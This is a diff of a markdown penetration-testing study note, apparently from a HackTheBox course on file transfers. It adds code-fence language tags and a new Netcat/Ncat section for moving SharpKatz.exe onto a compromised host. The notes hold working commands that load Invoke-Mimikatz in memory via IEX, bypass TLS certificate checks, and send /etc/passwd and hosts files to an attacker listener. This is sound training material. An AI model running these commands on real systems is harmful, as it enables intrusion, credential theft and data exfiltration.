@@ -22,7 +22,8 @@
 - [Transferring Files with Code](#transferring-files-with-code)
     - [Download files](#download-files)
     - [Upload files](#upload-files)
-
+- [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
+    - [Netcat / Ncat](#netcat--ncat)
 
 
 
@@ -67,7 +68,7 @@
 ##### PowerShell DownloadFile Method
 1. First Approach
     - File Download
-    ```
+    ```powershell
     PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
     PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
@@ -79,26 +80,26 @@
 
     - PowerShell DownloadString - Fileless Method
         - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
-    ```
+    ```powershell
     PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
     ```
 
 > [!NOTE] IEX also accepts pipeline input. 
 
-    ```
+    ```powershell
     PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
     ```
 
 3. Third Approach
 
     - From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.
-    ```
+    ```powershell
     PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
     ```
 ##### Common Errors with PowerShell
 1. There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
-```
+```powershell
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
 
 Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
@@ -111,7 +112,7 @@ At line:1 char:1
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ```
 2. Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
-```
+```powershell
 PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 
 Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
@@ -131,7 +132,7 @@ PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback
     2. Copy a File from the SMB Server `C:\htb> copy \\ATTACKING_BOX\share\nc.exe`
 
 - New versions of Windows block unauthenticated guest access, as we can see in the following command: 
-```
+```CMD
 C:\htb> copy \\192.168.220.133\share\nc.exe
 
 You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
@@ -180,7 +181,7 @@ You can't access this shared folder because your organization's security policie
 #### PowerShell Base64 Encode & Decode
 - **Steps**
     1. Encode the file using powershell then ensure whether it's transferred successfully
-    ```
+    ```powershell
     PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 
     IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
@@ -191,7 +192,7 @@ You can't access this shared folder because your organization's security policie
     3688374325B992DEF12793500307566D
     ```
     2. Decode on our attacking box 
-    ```
+    ```bash
     abdeonix@htb[/htb]$ echo ENCODED_VALUE | base64 -d > hosts
     ```
     - Ensure Integrity `md5sum hosts`
@@ -207,7 +208,7 @@ You can't access this shared folder because your organization's security policie
         2. Then, start the server `python3 -m uploadserver`
         3. We can use a PowerShell script PSUpload.ps1 which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.
         4. PowerShell Script to Upload a File to Python Upload Server
-        ```
+        ```powershell
         PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
         PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 
@@ -219,7 +220,7 @@ You can't access this shared folder because your organization's security policie
         - Using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request.
         1. Listen on our attack box `nc -lvnp 8000`
         2. Copy the output and use the base64 decode function to convert the base64 string into a file.
-        ```
+        ```powershell
         PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
         PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
         ```
@@ -251,7 +252,7 @@ You can't access this shared folder because your organization's security policie
 
 > [!TIP]
 > We can create a Command File for the FTP Client to Upload a File If we have not interactive shell
-> ```
+> ```CMD
 > C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 > C:\htb> echo USER anonymous >> ftpcommand.txt
 > C:\htb> echo binary >> ftpcommand.txt
@@ -362,7 +363,7 @@ You can't access this shared folder because your organization's security policie
 - We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code.
     1. JavaScript
         - Create wget.js:
-        ```
+        ```javascript
         var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
         WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
         WinHttpReq.Send();
@@ -376,7 +377,7 @@ You can't access this shared folder because your organization's security policie
     
     2. VBScript
         - Create wget.vbs:
-        ```
+        ```javascript
         dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
         dim bStrm: Set bStrm = createobject("Adodb.Stream")
         xHttp.Open "GET", WScript.Arguments.Item(0), False
@@ -396,3 +397,46 @@ You can't access this shared folder because your organization's security policie
 - **Steps**
     1. Starting the Python uploadserver Module: `python3 -m uploadserver`
     2. Uploading a File Using a Python One-liner: `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`
+
+## Miscellaneous File Transfer Methods
+### Netcat / Ncat
+- The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
+- **Steps**
+    1. We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename:
+    ```bash
+
+    victim@target:~$ # Example using Original Netcat
+    victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+
+    victim@target:~$ # Example using Ncat
+    victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+    ```
+
+    2. From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat.
+    ```bash
+    abdeonix@htb[/htb]$ # Example using Original Netcat
+    abdeonix@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+
+    abdeonix@htb[/htb]$ # Example using Ncat
+    abdeonix@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+    ```
+
+> [!TIP]
+> Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
+> ```bash
+> # Attack Host
+> abdeonix@htb[/htb]$ # Example using Original Netcat
+> abdeonix@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+> 
+> # Compromised Machine
+> victim@target:~$ # Example using Original Netcat
+> victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
+> 
+> # Attack Host 
+> abdeonix@htb[/htb]$ # Example using Ncat
+> abdeonix@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+> 
+> # Compromised Machine
+> victim@target:~$ # Example using Ncat
+> victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+> ```
